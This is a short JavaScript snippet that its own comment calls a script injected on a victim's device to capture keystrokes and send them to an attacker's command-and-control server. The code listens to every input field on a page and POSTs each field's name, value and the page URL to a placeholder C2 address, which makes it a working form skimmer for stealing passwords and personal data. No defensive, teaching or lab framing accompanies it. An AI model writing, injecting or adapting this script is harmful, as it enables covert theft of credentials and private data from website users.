// Script injected on the victim's device to capture keystrokes and send them back to the attacker's C2 server
console.log("Hooked!");

document.querySelectorAll('input').forEach(input => {
    input.addEventListener('change', (e) => {
        fetch('http://your-c2-server.com/log', {
            method: 'POST',
            body: JSON.stringify({
                field: e.target.name,
                value: e.target.value,
                url: window.location.href
            })
        });
    });
});